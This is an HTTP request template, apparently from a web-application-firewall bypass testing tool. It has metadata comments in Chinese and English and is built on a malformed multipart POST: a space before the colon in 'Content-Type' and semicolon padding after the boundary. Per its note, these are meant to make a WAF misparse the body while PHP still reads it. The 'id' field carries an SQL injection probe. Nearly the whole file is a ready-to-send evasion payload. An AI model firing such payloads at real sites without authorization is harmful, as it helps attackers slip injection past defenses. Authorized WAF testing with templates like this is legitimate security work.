# @name: multipart boundary垃圾填充
# @tags: post,multipart,boundary,garbage,padding,content-type,id,bypass
# @color: yellow
# @validate: baseline_similarity
# @threshold: 0.92
# @intent: multipart_boundary_garbage_padding
# @intent.param: id
# @intent.payload: id=1' and 'a'='a
# @note: Content-Type 冒号前插入空格(Content-Type :)，且 boundary 值后附加分号等任意填充。PHP 提取到真实 boundary=aaa，WAF 可能取到带填充的错误值或因冒号前空格解析失败。参考 do9gy Part2 第2条。
POST / HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
Content-Type : multipart/form-data; boundary=aaa;

--aaa
Content-Disposition: form-data; name="id"

1' and 'a'='a
--aaa--
